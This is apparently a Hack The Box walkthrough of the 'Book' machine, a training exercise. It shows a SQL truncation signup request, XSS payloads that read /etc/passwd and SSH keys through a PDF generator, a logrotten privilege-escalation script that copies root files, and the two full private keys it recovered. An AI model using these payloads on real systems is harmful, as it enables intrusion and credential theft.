---
title: "Book"
difficulty: Medium
os: Linux
points: 30
rating: 4.1
date: 2020-02-22
avatar: assets/htb/book.png
htb_url: https://app.hackthebox.com/machines/Book
---

## Overview

A medium-difficulty Linux box that I found mostly approachable, yet engaging enough to demonstrate a few clever twists on otherwise 'standard' attack techniques.

## Useful Skills and Tools

### Burp Repeater

An indispensable utility for any kind of website or web-app testing.  As the developers describe it:

> Burp Repeater is a simple tool for manually manipulating and reissuing individual HTTP requests, and analyzing the application's responses. You can send a request to Repeater from anywhere within Burp, modify the request and issue it over and over.

### Using an SSH Private Key for Remote Login

1. First, give your private key file the proper secure permissions `chmod 600 root.id_rsa`
2. Next use `-i <keyfile>` to identify the key to use: `ssh -i id_rsa <user>@<YOUR_IP>`
3. If prompted, enter the user's key decryption passphrase \(sometimes not set by the user, and separate from the user's Unix password.\)

### Linpeas.sh

A fantastic script that automates much of the tedious enumeration work, with a particular focus on surfacing privilege-escalation paths.  It won't catch everything, but it's an excellent first step whenever you land a fresh account on a host.  You can find the newest version of this script [here](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/).

## Enumeration

### Nmap scan

I kicked things off by running an nmap scan against `<YOUR_IP>`. My go-to options are: `-p-`, a shorthand that tells nmap to scan every port, `-sC` which is the same as `--script=default` and runs nmap's bundle of enumeration scripts against the host, `-sV` for service detection, and `-oN <name>` to write the results to a file named `<name>`.

```text
kac0@kali:~/htb/book$ nmap -p- -sC -sV -oN book.nmap <YOUR_IP>
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-04 14:38 EDTNmap scan report for <YOUR_IP>
Host is up (0.23s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8272.93 seconds
```

Only two ports were listening, `22 - SSH` and `80 - HTTP`, so the obvious next move was to investigate whatever was being served on port 80.

![](assets/wu/book/img-1.png)

Browsing to `http://<YOUR_IP>` brought up a login page.  Looking through the page's source code, I spotted an interesting script baked into the html.

```javascript
<script>
  window.console = window.console || function(t) {};
</script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
}
</script>
```

### SQL Truncate attack

It took a fair amount of reading before I turned up anything explaining how to exploit this.  At its core, the issue comes down to a timing gap between the check for an existing user and MySQL's default behavior of truncating overly-long strings.  When a user submits a username _\(here it's the `email` field, going by the login page\)_, the code checks that string against the existing users to decide whether it already exists.  If it doesn't, the value gets inserted into the database, truncated to the maximum allowed length.  

In this instance the script reveals that the admin set those truncation limits to 10 characters for `name` and 20 characters for `email`.  On top of truncating, MySQL also strips any trailing whitespace before storing the entry, which hands us an ideal attack vector. More information can be found at: [https://resources.infosecinstitute.com/sql-truncation-attack/\#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

![](assets/wu/book/img-2.png)

At this point I didn't yet have any valid usernames to target with the attack, so I registered a throwaway account and logged in.  

![](assets/wu/book/img-3.png)

Since I was after a username and/or email address, the Contact page struck me as the most probable spot to dig one up. 

![](assets/wu/book/img-4.png)

My guess paid off, and I found exactly what I needed on the `Contact Us` page.  The address `admin@book.htb` looked like a strong candidate for the Admin account's login.   

![](assets/wu/book/img-5.png)

Rather than jumping straight into some elaborate exploit, I first ran through a few common passwords, but every attempt returned this same message.

![](assets/wu/book/img-6.png)

### Attacking the Sign Up page using SQL Truncate

After that, I tried registering an admin account **without** applying anything I'd learned about SQL truncation, just to observe the behavior.  

![](assets/wu/book/img-7.png)

Attempting to \(re\)create the admin account without the SQL truncate trick produces the following alert message:

![](assets/wu/book/img-8.png)

That was exactly the result I'd anticipated.  Next I attempted the attack by padding the email field with a long run of spaces followed by the word 'test', pushing it well beyond the 20-character cap.  

![](assets/wu/book/img-9.png)

Unfortunately, it threw an error:  `A part following '@' should not contain the symbol ' '.`. \(This was in Chromium\).  Retrying in Firefox didn't help either, and just produced a generic "Please enter an email address" error.  So I launched Burp and intercepted my POST request to troubleshoot, forwarding it to Repeater so I could reproduce and tweak it freely.  

![](assets/wu/book/img-10.png)

When I replayed the identical request through Burp, it went through, much to my surprise.  My guess is that the browsers were performing their own form validation to block exactly this kind of attack.

```text
POST /index.php HTTP/1.1
Host: <YOUR_IP>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://<YOUR_IP>/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Connection: close
Cookie: PHPSESSID=630fii00brfacrkgee7jom2p4d
Upgrade-Insecure-Requests: 1
DNT: 1

name=admin&email=admin%40book.htb                                    test&password=!AmA$up3r@dmin!!!
```

Figuring my original password had maybe been too flimsy, I went back and set it to `!AmA$up3r@dmin!!!` instead of something trivially simple, so that other players wouldn't accidentally fall into the admin account without actually understanding the intended attack. 

![](assets/wu/book/img-11.png)

I then signed in with my freshly minted admin password and began poking around.  Nothing stood out as different in this account apart from the name I was logged in under.  

![](assets/wu/book/img-12.png)

I experimented with various payloads in the collections submission form, but couldn't get any of them to execute code.  The response was the same one I'd seen when uploading files as my basic user.  It looked like I'd run into a dead end.

## Enumeration with Dirbuster

I figured I'd review my Dirbuster results to see whether any hidden pages might prove useful.

```text
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Sun Jun 07 12:08:31 EDT 2020
--------------------------------

http://<YOUR_IP>:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/admin/

Dirs found with a 403 response:

/images/
/icons/
/docs/
/icons/small/
/admin/export/
/admin/vendor/

--------------------------------
Files found during testing:

Files found with a 302 responce:

/download.php
/contact.php
/search.php
/home.php
/profile.php
/books.php
/feedback.php
/admin/home.php
/admin/feedback.php
/admin/users.php
/admin/messages.php
/logout.php
/collections.php
/settings.php

Files found with a 200 responce:

/index.php
/admin/index.php
/db.php
--------------------------------
```

It was a nice surprise to find an `/admin/index.php` page in the list. 

![](assets/wu/book/img-13.png)

My first move was to check whether the "Forgot your password?" link did anything, but it wasn't wired up to anything and was non-functional.  So I used the admin credentials I'd created and logged in.  

## Initial Foothold

### Road to User

![](assets/wu/book/img-14.png)

Happily, the Administrator panel exposed some additional features.  

![](assets/wu/book/img-15.png)

Downloading the Collections PDF turned up something noteworthy.  Earlier, while messing around in the standard account, I'd done a test upload with both the Book Title and Author fields set to "a".  

![](assets/wu/book/img-16.png)

My 'book' showed up in the collection!  As you can see, the author and book title are reflected into the pdf inside what looks like an ordinary HTML table.  This appeared to be the code-reflection vulnerability I'd been hunting for.  With any luck there'd also be a way to get it to execute code.  

_The number beside my book looks random, and was a link to download precisely whatever I'd uploaded, named after that random number, presumably to limit additional code-execution avenues._

I also grabbed the Users collection in case anything useful was there, but mostly just got a good chuckle out of it.

![](assets/wu/book/img-17.png)

You can see other users' attempts at brute forcing the login page \(looks like burp intruder\), and toward the bottom there's what looks like an attempted SQL injection.  This document held hundreds of lines of similar attacks.  You can spot one of my `test` accounts near the top \(_and that  `peter` guy seems like a very friendly fellow!_\). Sadly, aside from me, nobody had messaged the admin hoping to land XSS execution via the Feedback page.

### Testing Code Execution with XSS

Having seen the name and title from my book submission rendered into the pdf in what appeared to be an HTML table, I wanted to find out whether cross site scripting was possible through this path.  Conveniently, there was already a write-up covering this exact scenario at [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html).  To start, I again submitted just the word 'test' in each field to confirm what I'd seen.

![](assets/wu/book/img-18.png)

I captured this POST in Burp and once more passed it to Repeater.  Sending it gave me the same pdf collection as before, with a random number next to the word 'test'.  Then I swapped the Book Title field for a basic XSS payload, `<img src=x onerror=document.write('test')>`. 

![](assets/wu/book/img-19.png)

_In case you were wondering, `51091.pdf` is simply one of the randomly named files I'd received when downloading the Collections PDF.  The file you upload doesn't appear to matter at all for this vulnerability_.

![](assets/wu/book/img-20.png)

This time only the word 'test' made it into the pdf!  That confirmed the XSS vulnerability.

### Local File Inclusion \(LFI\) through XSS - Cross Site Scripting

The Collections PDF is built from a dynamically generated HTML table. As a result, any code placed in fields that the page renders before saving to PDF will get executed.  That can be abused with JavaScript to perform XSS. I decided my next step was to pull a list of usernames by retrieving `/etc/passwd`.  My next request carried the following JavaScript in the title field:

```text
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

![](assets/wu/book/img-21.png)

After submitting my "book" with the command to read `/etc/passwd` through Burp, I was pleased to see the output in my browser.

![](assets/wu/book/img-22.png)

Now I'd not only leveraged an XSS vulnerability, but had also confirmed an LFI vulnerability. The output showed that only two users were able to log in: `reader` and `root`.  

### Finding user creds

None of my enumeration had turned up any passwords, so I decided to see whether the LFI vulnerability could tell me if `reader` had an SSH key file I could grab, given that port 22 was open.  I adapted the sample code from the blog post to blindly attempt to fetch the most common path and filename for a user's SSH key.  

```text
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

![](assets/wu/book/img-23.png)

My blind LFI attack worked! That said, copying all the text out of this PDF gave me output that looked a little off and wouldn't work for logging in.  Inspecting the right edge of the output, I noticed the text was being cut off for some reason.  Hoping it was just a rendering glitch rather than something trickier, I opened the file in a different program.  

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
-----END RSA PRIVATE KEY-----
```

Opening the PDF in Firefox gave the same display, but using `ctrl-a`, `ctrl-c` to select and copy everything let me grab the full contents.  For whatever reason the text was being clipped on the side and was unreachable in Kali's default PDF reader.  Opening it in a browser made the PDF's embedded HTML copyable, which in this case included the entire SSH key.  

_Also, as always remember to run **`chmod 600 $key_file`** before using SSH keys to log in._

```text
kac0@kali:~/htb/book$ ssh -i reader.id_rsa reader@<YOUR_IP>
                    
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jun  7 17:03:39 UTC 2020

  System load:  0.02               Processes:            265
  Usage of /:   26.5% of 19.56GB   Users logged in:      2
  Memory usage: 40%                IP address for ens33: <YOUR_IP>
  Swap usage:   0%

  => There is 1 zombie process.

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

114 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Jun  7 17:00:50 2020 from 10.10.14.147
reader@book:~$
```

### User.txt

First thing to do after logging in...collect my proof!

```text
reader@book:~$ cat user.txt 
51c1************************95bc
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User `reader`

After verifying sudo rights with `sudo -l` \(nothing available for this user, sadly\), my next habitual step when enumerating Linux hosts is to run [`linpeas.sh`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).  This script handles a lot of the routine enumeration and presents its findings in a clean, readable format.  It also offered an extra perk that turned out useful on this box.

```text
[+] Modified interesting files in the last 5mins
/tmp/temp/1.c                                                                                          
/var/log/auth.log
/var/log/lastlog
/var/log/syslog
/var/log/kern.log
/var/log/apache2/error.log
/var/log/apache2/access.log
/var/log/journal/8af6dac9d80548db9b25b66974ae4eb0/system.journal
/var/log/journal/8af6dac9d80548db9b25b66974ae4eb0/user-1000.journal
/var/log/wtmp
/home/reader/.gnupg/trustdb.gpg
/home/reader/.gnupg/pubring.kbx
```

### Logrotate exploitation \(logrotten\)

`linpeas.sh` also embeds links to a blog containing writeups for many different vulnerabilities.  Those links appear within the relevant output sections that list files tied to each exploit.  This time it looked like I wouldn't have to dig very hard, since one section showed a batch of log files alongside a link to a notable `logrotate`-based privilege-escalation route.

```text
[+] Writable log files (logrotten)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                 
Writable: /home/reader/backups/access.log.1                                                            
Writable: /home/reader/backups/access.log
```

`linpeas.sh` also flagged writable log files in `reader`'s home directory, noting that these might be exploitable via the `logrotate` service. Following the supplied link gave me this useful explanation:

> There is a vulnerability on logrotate that allows a user with write permissions over a log file or any of its parent directories to make logrotate write a file in any location. If logrotate is being executed by root, then the user will be able to write any file in `/etc/bash_completion.d/` that will be executed by any user that login. So, if you have write perms over a log file or any of its parent folder, you can privesc \(on most linux distributions, logrotate is executed automatically once a day as user root\). Also, check if apart of `/var/log` there are more files being rotated. More detailed information about the vulnerability can be found in this page [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition). You can exploit this vulnerability with [logrotten](https://github.com/whotwagner/logrotten).

Going through the `logrotten` documentation, I realized I needed to do a little more enumeration first to verify that I satisfied all the prerequisites.  

### Further enumeration as `reader`                                                                                         

```text
drwxr-xr-x 7 reader reader    4096 Jun  7 17:45 .
drwxr-xr-x 3 root   root      4096 Nov 19  2019 ..
drwxr-xr-x 2 reader reader    4096 Jun  7 17:00 backups
lrwxrwxrwx 1 reader reader       9 Nov 29  2019 .bash_history -> /dev/null
-rw-r--r-- 1 reader reader     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 reader reader    3771 Apr  4  2018 .bashrc
drwx------ 2 reader reader    4096 Nov 19  2019 .cache
drwx------ 3 reader reader    4096 Jun  7 17:47 .gnupg
drwxrwxr-x 3 reader reader    4096 Nov 20  2019 .local
-rw-r--r-- 1 reader reader     807 Apr  4  2018 .profile
-rwxrwxr-x 1 reader reader 3078592 Aug 22  2019 pspy64
drwx------ 2 reader reader    4096 Nov 28  2019 .ssh
-r-------- 1 reader reader      33 Nov 29  2019 user.txt
-rw------- 1 reader reader    1639 Jun  7 17:45 .viminfo
```

The `backups/` folder under `/home/reader` held two log files, both writable by `reader`. 

While monitoring running processes with [pspy](https://github.com/DominicBreuker/pspy), I caught this telling line: `2020/06/07 17:08:01 CMD: UID=0 PID=16535 | mysql book -e delete from users where email='admin@book.htb' and password<>'Sup3r_S3cur3_P455';`To me this looked like a script \(likely a cron job\) that kept resetting the password on the admin account I'd used to get in.  I tried that password against the root account in the hope it would work, but no luck.

```text
# see "man logrotate" for details
# rotate log files weekly
weekly

# use the syslog group by default, since this is the owning group
# of /var/log/syslog.
su root syslog

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

```

Within `/etc/logrotate.conf` I saw that the "create" option was enabled.  That left just one outstanding requirement for the exploit: I needed to confirm that `logrotate` was actually running \(as root\). 

After letting pspy run for a while, this entry appeared: `2020/06/07 17:08:30 CMD: UID=0 PID=16773 | /usr/sbin/logrotate -f /root/log.cfg.` So the host was indeed running `logrotate`, and it was pulling a config file out of the `/root directory`.  That seemed like sufficient proof the process was running as root, so it was time to put the exploit to the test and see whether I could escalate to root.

### Getting a root shell

From the exploit writer at [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten):

> #### Precondition for privilege escalation
>
> * [x] Logrotate has to be executed as root
> * [x] The logpath needs to be in control of the attacker
> * [x] Any option that creates files is set in the logrotate configuration
>
> #### To run the exploit:
>
> If "create"-option is set in logrotate.cfg:
>
> ```text
> ./logrotten -p ./payloadfile /tmp/log/pwnme.log
> ```
>
> If "compress"-option is set in logrotate.cfg:
>
> ```text
> ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
> ```

Based on my enumeration, every condition for the "create"-option variant of this exploit was satisfied, except for one detail not on the checklist.  I couldn't locate any `logrotate` configuration file referencing `access.log` in the `/home/reader/backups` folder. Since that was my writable log file, having it rotated by the service was pretty crucial.  I chose to try anyway, since it still looked like a promising path.  I built a payload that would hopefully grant me root access and ran the exploit.

```text
#!/bin/bash
/bin/cat /root/root.txt > /dev/shm/test
/bin/cat /root/.ssh/id_rsa > /dev/shm/test2
```

My payload was meant to exfiltrate both `root.txt` and `root`'s SSH key.

```text
reader@book:/dev/shm$ ./logrotten -p ./payload /home/reader/backups/access.log
Waiting for rotating /home/reader/backups/access.log...
Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
```

But simply launching the exploit wasn't sufficient on its own.  To trigger my script, I had to force a log rotation by writing a valid entry into the log.  I just copied a valid line from the backup file sitting in the same folder:

```text
reader@book:~/backups$ cat access.log.1
192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"
reader@book:~/backups$ cp access.log.1 access.log
```

### Root.txt

Time to gather my loot and find out whether I got the output I was hoping for.

```text
reader@book:/dev/shm$ cat test 
84da92adf998a1c7231297f70dd89714
```

Sure enough, the first file held the root flag!

```text
reader@book:/dev/shm$ cat test2
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsxp94IilXDxbAhMRD2PsQQ46mGrvgSPUh26lCETrWcIdNU6J
cFzQxCMM/E8UwLdD0fzUJtDgo4SUuwUmkPc6FXuLrZ+xqJaKoeu7/3WgjNBnRc7E
z6kgpwnf4GOqpvxx1R1W+atbMkkWn6Ne89ogCUarJFVMEszzuC+14Id83wWSc8uV
ZfwOR1y/Xqdu82HwoAMD3QG/gu6jER8V7zsC0ByAyTLT7VujBAP9USfqOeqza2UN
GWUqIckZ2ITbChBuTeahfH2Oni7Z3q2wXzn/0yubA8BpyzVut4Xy6ZgjpH6tlwQG
BEbULdw9d/E0ZFHN4MoNWuKtybx4iVMTBcZcyQIDAQABAoIBAQCgBcxwIEb2qSp7
KQP2J0ZAPfFWmzzQum26b75eLA3HzasBJOGhlhwlElgY2qNlKJkc9nOrFrePAfdN
PeXeYjXwWclL4MIAKjlFQPVg4v0Gs3GCKqMoEymMdUMlHoer2SPv0N4UBuldfXYM
PhCpebtj7lMdDGUC60Ha0C4FpaiJLdbpfxHase/uHvp3S/x1oMyLwMOOSOoRZZ2B
Ap+fnQEvGmp7QwfH+cJT8ggncyN+Gc17NwXrqvWhkIGnf7Bh+stJeE/sKsvG83Bi
E5ugJKIIipGpZ6ubhmZZ/Wndl8Qcf80EbUYs4oIICWCMu2401dvPMXRp7PCQmAJB
5FVQhEadAoGBAOQ2/nTQCOb2DaiFXCsZSr7NTJCSD2d3s1L6cZc95LThXLL6sWJq
mljR6pC7g17HTTfoXXM2JN9+kz5zNms/eVvO1Ot9GPYWj6TmgWnJlWpT075U3CMU
MNEzJtWyrUGbbRvm/2C8pvNSbLhmtdAg3pDsFb884OT8b4arufE7bdWHAoGBAMjo
y0+3awaLj7ILGgvukDfpK4sMvYmx4QYK2L1R6pkGX2dxa4fs/uFx45Qk79AGc55R
IV1OjFqDoq/s4jj1sChKF2+8+JUcrJMsk0WIMHNtDprI5ibYy7XfHe7oHnOUxCTS
CPrfj2jYM/VCkLTQzdOeITDDIUGG4QGUML8IbM8vAoGBAM6apuSTzetiCF1vVlDC
VfPEorMjOATgzhyqFJnqc5n5iFWUNXC2t8L/T47142mznsmleKyr8NfQnHbmEPcp
ALJH3mTO3QE0zZhpAfIGiFk5SLG/24d6aPOLjnXai5Wgozemeb5XLAGOtlR+z8x7
ZWLoCIwYDjXf/wt5fh3RQo8TAoGAJ9Da2gWDlFx8MdC5bLvuoOX41ynDNlKmQchM
g9iEIad9qMZ1hQ6WxJ8JdwaK8DMXHrz9W7yBXD7SMwNDIf6u1o04b9CHgyWXneMr
nJAM6hMm3c4KrpAwbu60w/AEeOt2o8VsOiusBB80zNpQS0VGRTYFZeCF6rKMTP/N
WU6WIckCgYBE3k00nlMiBNPBn9ZC6legIgRTb/M+WuG7DVxiRltwMoDMVIoi1oXT
ExVWHvmPJh6qYvA8WfvdPYhunyIstqHEPGn14fSl6xx3+eR3djjO6J7VFgypcQwB
yiu6RurPM+vUkQKb1omS+VqPH+Q7FiO+qeywqxSBotnLvVAiaOywUQ==
-----END RSA PRIVATE KEY-----
```

And the second file held the root SSH key as well.  The exploit had gone off without much trouble, aside from working out how to make `logrotate` run.  I was never entirely sure of the interval configured for backing up `access.log`, since I never managed to spot its config file. 

And, as always, remember to `chmod 600` your private SSH key files before use! _\(Yes I say this a lot. It's also easy to forget for some reason...\)_

```text
kac0@kali:~/htb/book$ chmod 600 root.id_rsa 
kac0@kali:~/htb/book$ ssh -i root.id_rsa root@<YOUR_IP>
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

114 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Feb 19 14:49:02 2020 from ::1
root@book:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
book
root@book:~#
```

## Solving the logrotate mystery

Once I had root, I figured out why I'd been unable to identify what was rotating the logs in `/home/reader/backups`.  The `/root` directory held some files for scrubbing other users' artifacts off the system, along with the script and config responsible for rotating `access.log` in the `backup/` folder.  

```text
root@book:~# cat log.sh
#!/bin/sh
/usr/sbin/logrotate -f /root/log.cfg

root@book:~# cat log.cfg 
/home/reader/backups/access.log {
        daily
        rotate 12
        missingok
        notifempty
        size 1k
        create
}
```

Mystery solved!
